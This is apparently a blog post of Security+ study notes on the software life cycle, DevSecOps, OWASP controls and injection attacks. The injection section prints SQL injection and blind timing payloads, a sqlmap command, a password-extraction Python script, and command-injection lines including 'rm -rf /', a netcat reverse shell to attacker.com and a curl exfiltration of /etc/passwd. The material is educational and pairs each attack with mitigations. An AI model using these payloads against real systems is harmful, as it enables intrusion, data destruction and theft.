---
title: Application Security
author: gourabdg47
date: 2025-04-09 09:05:00
categories:
  - Information
  - Security +
tags:
  - reading
  - certification
render_with_liquid: true
---

# Application  security
This chapter covers 
1. Domain 2.0: Threats, Vulnerabilities, and Mitigations
2. Domain 4.0: Security Operations
3. Domain 5.0: Security Program Management and Oversight

---
### Software development life cycle 
**SDLC** describes  the steps in a model for software development throughout its life. From idea to requirement gathering, analysis to design, coding, testing & rollout. Once the software is in production, it includes from user training, maintenance and decommissioning.

<img src="https://raw.githubusercontent.com/gourabdg47/gourabdg47.github.io/refs/heads/main/assets/images/SDLC.png" alt="High-level SDLC view" width="500" title="High-level SDLC view" />

#### Phases of SDLC
1. **Planning** : Initial investigation into weather the effort should occur. Here we looks for alternative solutions and high-level cost for each solutions 
2. **Requirements** : Getting customer input to determine the desired functionality and what improvements are required. Requirements may be ranked to determine which of them are the most critical to the success of the project. 
3. **Design** : Design for functionality, architecture, integration points, dataflow, business process and other required design consideration.
4. **Coding** : Development of the parts of the software, testing mainly unite testing (the testing of small components).
5. **Testing** : Majority of the testing occurs outside the coding phase, like testing with the customers, others outside of the development team
6. **Maintains**  : Making sure the software keeps on working as intended 

---

#### Static Testing vs Dynamic Testing vs Fuzzy Testing

| Type                    | What is it?                                                      | When does it happen?                  | Goal                                                              | Tools Used                                                               |
| ----------------------- | ---------------------------------------------------------------- | ------------------------------------- | ----------------------------------------------------------------- | ------------------------------------------------------------------------ |
| Static Testing          | Analyzing source code without running the program                | Before execution / during development | Find code-level vulnerabilities                                   | Static Code Analyzers (SonarQube, Checkmarx, Fortify, Bandit for Python) |
| Dynamic Testing         | Testing the application while it is running                      | After deployment / during execution   | Find runtime vulnerabilities                                      | DAST Tools (Burp Suite, OWASP ZAP, Acunetix, Nikto)                      |
| Fuzzy Testing (Fuzzing) | Sending random, unexpected, or invalid data to crash the program | During or after development           | Find unknown vulnerabilities like crashes, memory corruption, RCE | AFL, Peach Fuzzer, Sulley, BooFuzz                                       |

---

**DevOps** combines software development and IT operations with the goal of optimizing the SDLC. This is done by using collections of tools called toolchains to improve SDLC processes. The toolchain includes tools that assist with coding, building, testing, packaging, releasing, configuring monitoring software.
#### The Role of Security Practitioners in DevSecOps 🔒

In a **DevSecOps** model, security teams don’t just “check boxes” – they actively shape secure development workflows. Here’s what they do:
##### Key Responsibilities 🛠️

- **Threat Analysis**: Identify risks early in the development lifecycle.
- **Communication**: Bridge gaps between developers, ops, and leadership.
- **Planning & Testing**: Embed security into design and automate security checks.
- **Feedback Loops**: Improve processes by sharing insights with teams.
- **Continuous Improvement**: Update tools, policies, and training as threats evolve.

##### Collaboration & Awareness 🤝

- Understand the **organization’s risk tolerance** to prioritize effectively.
- Stay synced with **DevSecOps workflows** (who’s doing what, and when).

##### Integration with CI/CD Pipelines ⚙️

DevSecOps thrives in automated environments:

- **Automated Security Testing**: Scans for vulnerabilities during code commits.
- **Tooling**:

    - Configuration management (e.g., Ansible, Terraform).
    - Dependency scanners (e.g., Snyk, OWASP).
    - Patch management tools.

##### Key Takeaways 💡
Security in DevSecOps isn’t a gatekeeper – it’s a **continuous partner** that:

1. Adapts to agile workflows.
2. Balances speed with safety.
3. Leverages automation to scale securely.

---

#### Secure Designing & Coding
Being part of a SDLC as a security professional is a significant opportunity to improve the security of the application.  During the gathering and designing phase, when the security can be build as a part of the requirements then design according to the requirements. 
##### Secure Coding Practices: A Guide with OWASP 🔒

###### **Why OWASP?**

The **Open Worldwide Application Security Project (OWASP)** is a gold-standard resource for developers and security teams. It offers:

- Community-driven standards, guides, and tools.
- Up-to-date best practices for web application security.
- Insights into evolving cyber threats.

📌 _Tip_: OWASP’s Proactive Controls list is a must-read to stay ahead of risks !
### OWASP’s Top 10 Proactive Controls

1. **Define Security Requirements**  
    Bake security into _every_ phase of development, not as an afterthought.
    
2. **Leverage Security Frameworks**  
    Use trusted libraries (e.g., OAuth, Spring Security) to avoid reinventing the wheel.
    
3. **Secure Database Access**
    
    - Use prebuilt queries to block SQL injection.
    - Restrict database permissions strictly.
        
4. **Encode & Escape Data**  
    Sanitize inputs by stripping special characters (e.g., `<script>` becomes harmless).
    
5. **Validate All Inputs**  
    Treat _all_ user-provided data as untrusted—filter rigorously.
    
6. **Implement Digital Identity**
    
    - Enforce MFA and secure password hashing.
    - Manage sessions with timeouts and encryption.
        
7. **Enforce Access Controls**
    
    - Apply "deny by default" and the principle of **least privilege**.
    - Audit permissions regularly.
        
8. **Protect Data Everywhere**  
    Encrypt data _both_ in transit (HTTPS/TLS) and at rest (AES-256).
    
9. **Enable Logging & Monitoring**  
    Track anomalies to detect breaches early and investigate incidents.
    
10. **Handle Errors Gracefully**
    
    - Never expose sensitive info in error messages.
    - Test failure scenarios to ensure smooth recovery.
        
##### **Resources to Level Up**

- 📜 [OWASP Proactive Controls](https://owasp.org/www-project-proactive-controls)
- 🚀 [Secure Coding Quick Reference Guide](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide)

##### **Key Takeaway**

OWASP’s guidelines aren’t just rules—they’re a **mindset shift**. By embedding these practices early, teams build security into their DNA, reducing risks without slowing innovation.

---

<div style="background-color: #ffebee; border-left: 4px solid #ff4444; padding: 12px; margin: 16px 0; border-radius: 4px;">
  <p style="color: #ff4444; margin: 0; font-weight: bold;">⚠️ WARNING: EDUCATIONAL USE ONLY</p>
  <p style="color: #b71c1c; margin: 8px 0 0 0;">The examples below demonstrate cybersecurity concepts for learning purposes. Never attempt these techniques on systems without explicit authorization.</p>
</div>

### Injection Vulnerabilities: The Hacker’s Gateway
Let's turn our attention to the motivating force behind putting these mechanisms in place: the vulnerabilities that attackers may exploit to undermine our security.
**Injection flaws** rank among the _top attack vectors_ for breaching web applications. They let attackers inject malicious code into input fields, tricking servers into executing unintended commands—often with catastrophic results.

#### Why It Matters

- **Common Targets**: Login forms, search bars, APIs.
- **Impact**: Data theft, system takeover, or backend server compromise.
- **Examples**: SQL injection, OS command injection, LDAP injection.
#### How Attackers Exploit Injections

1. **Malicious Input**: Attackers submit code (e.g., SQL queries, shell commands) into vulnerable fields.
2. **Server Deception**: The server processes the input as a legitimate command.
3. **Execution**: The code runs on the server _or_ passes to downstream systems (e.g., databases).

#### SQL Injections Attacks
Web apps often take user input (like search terms) and use it to build database queries. For example, an e-commerce site might process a search for **"orange tiger pillow"** like this :

```SQL
SELECT ItemName, ItemDescription, ItemPrice  
FROM Products  
WHERE ItemName LIKE '%orange%'  
AND ItemName LIKE '%tiger%'  
AND ItemName LIKE '%pillow%'; 
```  

##### What’s Happening Here?

1. The app breaks the search into keywords.
2. It queries the database for items matching **all** terms.
3. Results are returned to the user.

##### Bypassing Security
An attacker submits this search term  :

```SQL
' OR 1=1; --  
```

The app naively converts this into :

```SQL
SELECT ItemName, ItemDescription, ItemPrice  
FROM Products  
WHERE ItemName LIKE '%' OR 1=1; --%'  
AND ItemName LIKE '%tiger%'  
AND ItemName LIKE '%pillow%';  
```

##### What Happens?

1. **`' OR 1=1;`** makes the first `LIKE` condition **always true** (`1=1` is universally true).
2. **`--`** comments out the rest of the query.
3. The database returns **all products**, not just matching items.

#### Blind SQL Injection: When Attackers Can’t "See"
In basic SQL injection attacks, hackers input malicious code and **directly observe** the results (e.g., dumped data or errors). But what if the app hides those results? Enter **blind SQL injection**—exploiting vulnerabilities _without_ direct feedback.
###### **Content-Based Blind Injection**
Attackers infer results based on changes in the app’s response (e.g., content, HTTP status codes)._
###### Scenario
A vulnerable e-commerce site hides database errors but returns a generic "No results found" page for invalid searches.

**Step 1: Confirm Vulnerability**

```SQL
' AND 1=1 --  
```

- If the page shows results: The condition `1=1` (always true) is executed.
- If the page shows "No results": The app is not vulnerable.

**Step 2: Extract Admin Password (Character by Character)**

```SQL
' AND (SELECT SUBSTRING(password,1,1) FROM Users WHERE username='admin') = 'a' --  
```

- If the page shows results: The first character of `admin`’s password is **`a`**.
- Repeat with `'b'`, `'c'`, etc., until the page behaves normally.

Attackers use tools like **sqlmap** to brute-force all characters  :

```BASH
sqlmap -u "https://example.com/search?term=*" --technique=B --level=5 --risk=3  
```

###### **Timing-Based Blind SQL Injection**
_Attackers infer results based on server response delays._

###### Scenario
A login form doesn’t return errors or data but is vulnerable to time delays.

**Step 1: Confirm Vulnerability**

```SQL
' ; IF (1=1) WAITFOR DELAY '0:0:5' --  
```

- If the page takes **5 seconds** to respond: The database executes the delay.
- If it responds instantly: Not vulnerable.

**Step 2: Extract Database Version**

```SQL
' ; IF (SUBSTRING(@@version,1,1)='5') SLEEP(5) --  
```

- If the response is delayed: The database version starts with **`5`** (e.g., MySQL 5.x).

**Step 3: Steal Data via Delays**

```SQL
' ; IF (SELECT COUNT(*) FROM Orders) > 1000 SLEEP(10); --  
```

- A **10-second delay** confirms the `Orders` table has over 1,000 entries.

Attackers script delays to map out data :

```Python
import requests  
import time  

url = "https://example.com/login"  
chars = "abcdef0123456789"  

for char in chars:  
    payload = f"' ; IF (SELECT SUBSTRING(password,1,1) FROM Users WHERE id=1)='{char}' SLEEP(5) -- "  
    start = time.time()  
    requests.post(url, data={"username": "admin", "password": payload})  
    if time.time() - start > 5:  
        print(f"First character: {char}")  
        break  
```

###### **Comparison Table**

|Technique|How It Works|Use Case|
|---|---|---|
|**Content-Based**|Analyze page content/behavior|Enumerating users, passwords|
|**Timing-Based**|Measure response delays|Confirming database size, version|

#### **Mitigation Strategies**

- **Parameterized Queries** 
- **Web Application Firewalls (WAF)**: Block suspicious patterns (e.g., `SLEEP`, `WAITFOR`).
- **Error Handling**: Return generic messages (no database details).

##### **Key Takeaway**

> Blind SQLi turns _silent clues_ into full-scale breaches. Even without direct feedback, attackers can steal data one character—or one second—at a time.


#### Command Injection Attack
Command injection is a critical vulnerability where attackers **hijack an app’s OS-level commands** to manipulate servers, steal data, or even take full system control.
##### How It Happens

Apps that execute OS commands (e.g., file operations, system checks) without proper safeguards can turn user inputs into **backdoors**.
###### Scenario
A weather app lets users check server status by entering an IP address :

```Python
# Vulnerable Python Code  
import os  
user_input = request.GET.get('ip')  
os.system(f"ping {user_input}")  # 🚨 Danger!  
```

An attacker injects :

```Bash
8.8.8.8; rm -rf /  # Deletes all files if app runs as root!  
```

The server executes : 

```Bash
ping 8.8.8.8; rm -rf /  
```

##### Why It’s Dangerous

- **Full System Access**: Commands run with the app’s privileges (often root/admin).
- **Data Theft**: Exfiltrate files, databases, or secrets.
- **Persistence**: Install backdoors, crypto miners or ransomware.

##### Real-World Attack Types

| Attack Type           | Payload Example                     | Impact                         |                      |
| --------------------- | ----------------------------------- | ------------------------------ | -------------------- |
| **File Deletion**     | `; rm -rf /var/www`                 | Wipes critical data.           |                      |
| **Reverse Shell**     | `; nc -e /bin/sh attacker.com 4444` | Grants remote terminal access. |                      |
| **Data Exfiltration** | `; cat /etc/passwd                  | curl -X POST hacker.com`       | Steals system files. |

##### How to Prevent

1. **Avoid OS Commands** : Use built-in libraries (e.g., Python’s `subprocess` with `shell=False`).
2. **Input Validation**  : re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$',  ip) # Only check IPv4
3. **Least Privilege** : Run apps with limited OS permissions.
4. **Sandboxing** : Isolate risky processes in containers/virtual machines.

##### **Key Takeaway**

> "Command injection turns user inputs into a Trojan horse. Validate strictly, sanitize ruthlessly, and never trust raw input."




---

> To get in touch with me or for general discussion please visit [ZeroDayMindset Discussion](https://github.com/orgs/X3N0-G0D/discussions/1) 
{: .prompt-info }